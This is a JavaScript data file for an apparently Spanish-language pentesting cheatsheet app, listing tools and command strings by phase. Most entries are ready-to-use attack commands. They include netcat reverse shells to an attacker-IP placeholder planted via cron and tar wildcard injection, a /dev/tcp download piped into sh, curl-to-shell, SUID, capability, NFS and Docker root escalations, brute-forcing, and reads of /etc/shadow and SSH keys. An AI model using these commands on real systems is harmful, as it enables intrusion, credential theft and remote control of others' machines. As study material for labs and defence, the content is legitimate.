/**
 * Cheatsheet de pentesting por secciones y herramientas
 */
export const cheatsheetSections = [
  { id: 'reconocimiento', titleKey: 'cheatsheet_section_recon' },
  { id: 'ataques-fuerza-bruta', titleKey: 'cheatsheet_section_brute_force' },
  { id: 'post-explotacion', titleKey: 'cheatsheet_section_post_explotacion' },
  { id: 'manejo-acceso', titleKey: 'cheatsheet_section_manejo_acceso' },
  { id: 'escalada', titleKey: 'cheatsheet_section_escalada' },
  { id: 'recursos', titleKey: 'cheatsheet_section_recursos' },
];

export const cheatsheetTools = {
  // ========== RECONOCIMIENTO ==========
  nmap: {
    id: 'nmap',
    sectionId: 'reconocimiento',
    name: 'Nmap',
    descKey: 'cheatsheet_nmap_desc',
    categories: [
      {
        titleKey: 'cheatsheet_nmap_cat1_title',
        commands: [
          { descKey: 'cheatsheet_nmap_cat1_cmd1', cmd: 'nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [ip]' },
          { descKey: 'cheatsheet_nmap_cat1_cmd2', cmd: 'nmap -sCV -p[port1,port2] [ip]' },
        ],
      },
      {
        titleKey: 'cheatsheet_nmap_cat2_title',
        params: [
          { param: '-sS', descKey: 'cheatsheet_nmap_param_sS' },
          { param: '-sT', descKey: 'cheatsheet_nmap_param_sT' },
          { param: '-sV', descKey: 'cheatsheet_nmap_param_sV' },
          { param: '-sC', descKey: 'cheatsheet_nmap_param_sC' },
          { param: '-O', descKey: 'cheatsheet_nmap_param_O' },
          { param: '-p-', descKey: 'cheatsheet_nmap_param_p' },
          { param: '-Pn', descKey: 'cheatsheet_nmap_param_Pn' },
          { param: '-n', descKey: 'cheatsheet_nmap_param_n' },
          { param: '--min-rate', descKey: 'cheatsheet_nmap_param_minrate' },
          { param: '--open', descKey: 'cheatsheet_nmap_param_open' },
          { param: '-T4 / -T2', descKey: 'cheatsheet_nmap_param_T' },
          { param: '-oA', descKey: 'cheatsheet_nmap_param_oA' },
        ],
      },
    ],
  },
  gobuster: {
    id: 'gobuster',
    sectionId: 'reconocimiento',
    name: 'Gobuster',
    descKey: 'cheatsheet_gobuster_desc',
    categories: [
      {
        titleKey: 'cheatsheet_gobuster_cat1_title',
        commands: [
          { descKey: 'cheatsheet_gobuster_cat1_cmd1', cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' },
          { descKey: 'cheatsheet_gobuster_cat1_cmd2', cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt' },
        ],
      },
      {
        titleKey: 'cheatsheet_gobuster_cat2_title',
        commands: [
          { descKey: 'cheatsheet_gobuster_cat2_cmd2', cmd: 'gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --resolver 8.8.8.8' },
        ],
      },
      {
        titleKey: 'cheatsheet_gobuster_cat3_title',
        params: [
          { param: '-q', descKey: 'cheatsheet_gobuster_param_q' },
          { param: '--status-codes-blacklist', descKey: 'cheatsheet_gobuster_param_blacklist' },
          { param: '-t', descKey: 'cheatsheet_gobuster_param_t' },
          { param: '--timeout', descKey: 'cheatsheet_gobuster_param_timeout' },
          { param: '-c', descKey: 'cheatsheet_gobuster_param_c' },
          { param: 'vhost', descKey: 'cheatsheet_gobuster_param_vhost' },
        ],
      },
    ],
  },
  // ========== FUZZING ==========
  ffuf: {
    id: 'ffuf',
    sectionId: 'reconocimiento',
    name: 'FFUF',
    descKey: 'cheatsheet_ffuf_desc',
    categories: [
      {
        titleKey: 'cheatsheet_ffuf_cat1_title',
        commands: [
          { descKey: 'cheatsheet_ffuf_cat1_cmd1', cmd: 'ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "[target_url]" -H "Host: FUZZ.[target_domain]"' },
          { descKey: 'cheatsheet_ffuf_cat1_cmd2', cmd: 'ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -u "[target_url]" -d "username=FUZZ&password=password123" -H "Content-Type: application/x-www-form-urlencoded"' },
          { descKey: 'cheatsheet_ffuf_cat1_cmd3', cmd: 'ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [target_url]/FUZZ' },
          { descKey: 'cheatsheet_ffuf_cat1_cmd4', cmd: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u [target_url]/index.php?FUZZ=whoami' },
        ],
      },
      {
        titleKey: 'cheatsheet_ffuf_cat2_title',
        params: [
          { param: '-w', descKey: 'cheatsheet_ffuf_param_w' },
          { param: '-u', descKey: 'cheatsheet_ffuf_param_u' },
          { param: '-X', descKey: 'cheatsheet_ffuf_param_X' },
          { param: '-d', descKey: 'cheatsheet_ffuf_param_d' },
          { param: '-H', descKey: 'cheatsheet_ffuf_param_H' },
          { param: '-fs', descKey: 'cheatsheet_ffuf_param_fs' },
          { param: '-fl', descKey: 'cheatsheet_ffuf_param_fl' },
          { param: '-fw', descKey: 'cheatsheet_ffuf_param_fw' },
          { param: '-t', descKey: 'cheatsheet_ffuf_param_t' },
          { param: '-c', descKey: 'cheatsheet_ffuf_param_c' },
          { param: '-v', descKey: 'cheatsheet_ffuf_param_v' },
          { param: '-x', descKey: 'cheatsheet_ffuf_param_x' },
        ],
      },
    ],
  },
  'recon-red': {
    id: 'recon-red',
    sectionId: 'reconocimiento',
    nameKey: 'cheatsheet_recon_red',
    descKey: 'cheatsheet_recon_red_desc',
    categories: [
      {
        titleKey: 'cheatsheet_recon_red_title',
        commands: [
          { descKey: 'cheatsheet_recon_arp', cmd: 'arp-scan -I eth0 -localnet -ignoredups' },
          { descKey: 'cheatsheet_recon_ss', cmd: 'ss -tln' },
          { descKey: 'cheatsheet_recon_netstat', cmd: 'netstat -tnlp' },
          { descKey: 'cheatsheet_recon_whatweb', cmd: 'whatweb [ip]' },
        ],
      },
    ],
  },

  // ========== ATAQUES DE FUERZA BRUTA ==========
  searchsploit: {
    id: 'searchsploit',
    sectionId: 'post-explotacion',
    name: 'Searchsploit',
    descKey: 'cheatsheet_searchsploit_desc',
    categories: [
      {
        titleKey: 'cheatsheet_searchsploit_title',
        commands: [
          { descKey: 'cheatsheet_searchsploit_search', cmd: 'searchsploit [name]' },
          { descKey: 'cheatsheet_searchsploit_x', cmd: 'searchsploit -x [path|name]' },
          { descKey: 'cheatsheet_searchsploit_m', cmd: 'searchsploit -m [path|name]' },
        ],
      },
    ],
  },

  // ========== POST-EXPLOTACIÓN ==========
  hydra: {
    id: 'hydra',
    sectionId: 'ataques-fuerza-bruta',
    name: 'Hydra',
    descKey: 'cheatsheet_hydra_desc',
    categories: [
      {
        titleKey: 'cheatsheet_hydra_title',
        commands: [
          { descKey: 'cheatsheet_hydra_cmd1', cmd: 'hydra [protocol]://[host]:[port] -l [user] -P /usr/share/wordlists/rockyou.txt' },
        ],
      },
    ],
  },
  john: {
    id: 'john',
    sectionId: 'ataques-fuerza-bruta',
    name: 'John the Ripper',
    descKey: 'cheatsheet_john_desc',
    categories: [
      {
        titleKey: 'cheatsheet_john_title',
        commands: [
          { descKey: 'cheatsheet_john_crack', cmd: 'john -w:/usr/share/wordlists/rockyou.txt hash' },
          { descKey: 'cheatsheet_john_show', cmd: 'john --show hash' },
        ],
      },
    ],
  },

  // ========== RCE ==========
  rce: {
    id: 'rce',
    sectionId: 'post-explotacion',
    nameKey: 'cheatsheet_rce_name',
    descKey: 'cheatsheet_rce_desc',
    categories: [
      {
        titleKey: 'cheatsheet_rce_title',
        commands: [
          { descKey: 'cheatsheet_rce_revshell', cmd: 'https://www.revshells.com/' },
          { descKey: 'cheatsheet_rce_nc_listen', cmd: 'nc -nlvp 9999' },
        ],
      },
    ],
  },

  // ========== MANEJO DE ACCESO ==========
  consola: {
    id: 'consola',
    sectionId: 'manejo-acceso',
    nameKey: 'cheatsheet_consola_name',
    descKey: 'cheatsheet_consola_desc',
    categories: [
      {
        titleKey: 'cheatsheet_consola_title',
        commands: [
          { descKey: 'cheatsheet_consola_script', cmd: 'script /dev/null -c bash' },
          { descKey: 'cheatsheet_consola_stty', cmd: 'stty raw -echo; fg' },
          { descKey: 'cheatsheet_consola_reset', cmd: 'reset xterm' },
          { descKey: 'cheatsheet_consola_stty_size', cmd: 'stty rows X columns Y' },
          { descKey: 'cheatsheet_consola_term', cmd: 'export TERM=xterm' },
          { descKey: 'cheatsheet_consola_shell', cmd: 'export SHELL=bash' },
        ],
      },
    ],
  },

  // ========== PORT FORWARDING ==========
  portfw: {
    id: 'portfw',
    sectionId: 'manejo-acceso',
    nameKey: 'cheatsheet_portfw_name',
    descKey: 'cheatsheet_portfw_desc',
    categories: [
      {
        titleKey: 'cheatsheet_portfw_title',
        commands: [
          { descKey: 'cheatsheet_portfw_ssh', cmd: 'ssh -L [attacker_port]:[ip_local_victim:port_victim] [username@ip_victim]' },
          { descKey: 'cheatsheet_portfw_example', cmd: 'ssh -L 9999:localhost:8080 [username@ip_victim]' },
        ],
      },
    ],
  },

  // ========== RECURSOS ==========
  payloads: {
    id: 'payloads',
    sectionId: 'recursos',
    nameKey: 'cheatsheet_payloads_title',
    descKey: 'cheatsheet_payloads_desc',
    categories: [
      {
        titleKey: 'cheatsheet_blank',
        commands: [
          { descKey: 'cheatsheet_payloads_hacktricks', cmd: 'https://book.hacktricks.wiki/en/index.html' },
          { descKey: 'cheatsheet_payloads_repo', cmd: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master' },
          { descKey: 'cheatsheet_payloads_web', cmd: 'https://swisskyrepo.github.io/PayloadsAllTheThings/' },
        ],
      },
    ],
  },
  diccionarios: {
    id: 'diccionarios',
    sectionId: 'recursos',
    nameKey: 'cheatsheet_diccionarios_name',
    descKey: 'cheatsheet_diccionarios_desc',
    categories: [
      {
        titleKey: 'cheatsheet_diccionarios_title',
        commands: [
          { descKey: 'cheatsheet_dic_dir_medium', cmd: '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt' },
          { descKey: 'cheatsheet_dic_dir_big', cmd: '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' },
          { descKey: 'cheatsheet_dic_subdomains', cmd: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt' },
        ],
      },
    ],
  },
  compartir: {
    id: 'compartir',
    sectionId: 'recursos',
    nameKey: 'cheatsheet_compartir_name',
    descKey: 'cheatsheet_compartir_desc',
    categories: [
      {
        titleKey: 'cheatsheet_compartir_title',
        commands: [
          { descKey: 'cheatsheet_compartir_scp', cmd: 'scp [filename] [username@ip:path]' },
          { descKey: 'cheatsheet_compartir_python_server', cmd: 'python3 -m http.server 8000' },
          { descKey: 'cheatsheet_compartir_wget_download', cmd: 'wget http://[attacker_ip]:8000/[filename]' },
        ],
      },
    ],
  },

  // ========== ESCALADA DE PRIVILEGIOS ==========
  escalada: {
    id: 'escalada',
    sectionId: 'escalada',
    nameKey: 'cheatsheet_escalada_name',
    descKey: 'cheatsheet_escalada_desc',
    categories: [
      {
        titleKey: 'cheatsheet_escalada_general',
        commands: [
          { descKey: 'cheatsheet_escalada_gtfo', cmd: 'https://gtfobins.org/' },
          { descKey: 'cheatsheet_escalada_nc_host', cmd: 'sudo nc -q 5 -lvnp 80 < linpeas.sh' },
          { descKey: 'cheatsheet_escalada_nc_victim', cmd: 'cat < /dev/tcp/[attacker_ip]/[attacker_port] | sh' },
          { descKey: 'cheatsheet_escalada_linpeas', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
          { descKey: 'cheatsheet_escalada_winpeas', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS' },
          { descKey: 'cheatsheet_escalada_enum', cmd: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_sudo',
        commands: [
          { descKey: 'cheatsheet_escalada_sudo_list', cmd: 'sudo -l' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_suid',
        commands: [
          { descKey: 'cheatsheet_escalada_suid_find', cmd: 'find / -perm -4000 2>/dev/null' },
          { descKey: 'cheatsheet_escalada_suid_find_specific', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
          { descKey: 'cheatsheet_escalada_suid_nmap', cmd: 'nmap --interactive' },
          { descKey: 'cheatsheet_escalada_suid_find_shell', cmd: 'find /etc/passwd -exec /bin/sh \;' },
          { descKey: 'cheatsheet_escalada_find_file_type', cmd: 'find / -name "*.txt" -type f 2>/dev/null' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_capabilities',
        commands: [
          { descKey: 'cheatsheet_escalada_cap_list', cmd: 'getcap -r / 2>/dev/null' },
          { descKey: 'cheatsheet_escalada_cap_python', cmd: 'python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"' },
          { descKey: 'cheatsheet_escalada_cap_tcpdump', cmd: 'tcpdump -i eth0 -w /tmp/capture -n -U -s 0 -c 1' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_cron',
        commands: [
          { descKey: 'cheatsheet_escalada_cron_list', cmd: 'cat /etc/crontab' },
          { descKey: 'cheatsheet_escalada_cron_user', cmd: 'crontab -l' },
          { descKey: 'cheatsheet_escalada_cron_dir', cmd: 'ls -la /etc/cron.*' },
          { descKey: 'cheatsheet_escalada_cron_wildcard', cmd: 'echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc [attacker_ip] [attacker_port] >/tmp/f" > cron.sh' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_path',
        commands: [
          { descKey: 'cheatsheet_escalada_path_check', cmd: 'echo $PATH' },
          { descKey: 'cheatsheet_escalada_path_write', cmd: 'echo \'/bin/sh\' > /tmp/ls' },
          { descKey: 'cheatsheet_escalada_path_chmod', cmd: 'chmod +x /tmp/ls' },
          { descKey: 'cheatsheet_escalada_path_export', cmd: 'export PATH=/tmp:$PATH' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_nfs',
        commands: [
          { descKey: 'cheatsheet_escalada_nfs_exports', cmd: 'cat /etc/exports' },
          { descKey: 'cheatsheet_escalada_nfs_showmount', cmd: 'showmount -e [victim_ip]' },
          { descKey: 'cheatsheet_escalada_nfs_mount', cmd: 'mkdir /tmp/nfs_mount && mount -o rw,vers=3 <victim_ip>:/tmp /tmp/nfs_mount' },
          { descKey: 'cheatsheet_escalada_nfs_uid', cmd: 'echo "int main() { setuid(0); system("/bin/bash"); return 0; }" > /tmp/nfs_mount/shell.c' },
          { descKey: 'cheatsheet_escalada_nfs_uid2', cmd: 'gcc /tmp/nfs_mount/shell.c -o /tmp/nfs_mount/shell' },
          { descKey: 'cheatsheet_escalada_nfs_uid3', cmd: 'chmod +s /tmp/nfs_mount/shell' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_kernel',
        commands: [
          { descKey: 'cheatsheet_escalada_kernel_version', cmd: 'uname -a' },
          { descKey: 'cheatsheet_escalada_kernel_exploit', cmd: 'searchsploit [linux_version]' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_docker',
        commands: [
          { descKey: 'cheatsheet_escalada_docker_check', cmd: 'docker ps' },
          { descKey: 'cheatsheet_escalada_docker_mount', cmd: 'docker run -v /:/hostFS -it ubuntu bash' },
          { descKey: 'cheatsheet_escalada_docker_socket', cmd: 'docker -H unix:///var/run/docker.sock run -v /:/hostFS ubuntu' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_wildcard',
        commands: [
          { descKey: 'cheatsheet_escalada_wildcard_tar', cmd: 'echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [attacker_port] >/tmp/f" > shell.sh' },
          { descKey: 'cheatsheet_escalada_wildcard_chmod', cmd: 'chmod +x shell.sh' },
          { descKey: 'cheatsheet_escalada_wildcard_touch', cmd: 'touch "--checkpoint=1" "--checkpoint-action=exec=sh shell.sh"' },
        ],
      },
      {
        titleKey: 'cheatsheet_escalada_passwords',
        commands: [
          { descKey: 'cheatsheet_escalada_passwd_shadow', cmd: 'cat /etc/shadow' },
          { descKey: 'cheatsheet_escalada_passwd_passwd', cmd: 'cat /etc/passwd' },
          { descKey: 'cheatsheet_escalada_passwd_history', cmd: 'cat ~/.bash_history' },
          { descKey: 'cheatsheet_escalada_passwd_mysql', cmd: 'cat /etc/mysql/my.cnf' },
          { descKey: 'cheatsheet_escalada_passwd_ssh', cmd: 'find / -name "id_rsa*" 2>/dev/null' },
        ],
      },
    ],
  },
};
